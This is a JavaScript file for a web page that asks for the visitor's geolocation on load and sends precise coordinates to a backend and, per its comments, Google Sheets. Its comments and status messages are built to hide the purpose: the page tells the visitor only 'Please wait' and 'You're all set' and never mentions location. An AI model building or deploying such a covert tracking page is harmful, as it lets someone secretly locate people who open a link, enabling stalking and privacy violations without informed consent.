/**
 * Auto location flow.
 * As soon as the page opens, the browser shows the geolocation permission
 * prompt. If the user allows it, coordinates are sent to the backend
 * (and Google Sheets) immediately — with no location details shown in the UI.
 */

const statusEl = document.getElementById("status");

/** Show a short, generic status message (never mentions location). */
function setStatus(message, tone = "info") {
  statusEl.hidden = false;
  statusEl.textContent = message;
  statusEl.className = `status is-${tone}`;
}

/** Send location payload to the Express backend without exposing it in the UI. */
async function sendLocationToServer(payload) {
  const response = await fetch("/api/locations", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const data = await response.json().catch(() => ({}));
    console.error("Backend save failed:", data.error || response.status);
  }
}

/**
 * Ask the browser for the current position.
 * Calling this on page load triggers the native permission prompt.
 */
function requestBrowserLocation() {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(new Error("unsupported"));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0,
    });
  });
}

/** Runs automatically when the page loads. */
async function startOnPageOpen() {
  setStatus("Please wait…", "info");

  try {
    // Browser shows the location permission popup immediately.
    const position = await requestBrowserLocation();

    // Only runs after the user taps Allow.
    const payload = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      timestamp: position.timestamp,
    };

    await sendLocationToServer(payload);
  } catch (error) {
    // Stay generic in the UI — do not mention location sharing.
    console.error("Auto location flow error:", error);
  } finally {
    setStatus("You’re all set. You can close this page.", "ok");
  }
}

startOnPageOpen();
